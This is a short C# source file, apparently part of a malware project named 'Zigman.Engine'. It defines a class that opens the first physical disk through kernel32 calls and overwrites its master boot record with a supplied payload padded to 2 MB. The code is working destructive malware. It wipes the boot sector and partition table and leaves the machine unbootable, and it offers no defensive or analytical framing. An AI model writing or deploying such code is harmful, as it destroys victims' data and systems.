using System.Runtime.InteropServices;

namespace Zigman.Engine;

/// <summary>
/// Overwrite MBR
/// </summary>
public class MbrOverwrite
{
    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32")]
    private static extern bool WriteFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped);

    /// <summary>
    /// Overwrite MBN
    /// </summary>
    /// <param name="buffer">MBR payload</param>
    /// <exception cref="Exception">Buffer length is not 512</exception>
    public static void Overwrite(byte[] buffer)
    {
        if (buffer.Length != 512)
            throw new Exception("Buffer length is not 512!");
        var mbr = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 
            0x1 | 0x2, IntPtr.Zero, 
            0x3, 0, IntPtr.Zero);
        Array.Resize(ref buffer, 2097152);
        WriteFile(mbr, buffer, (uint)buffer.Length, out _, IntPtr.Zero);
    }
}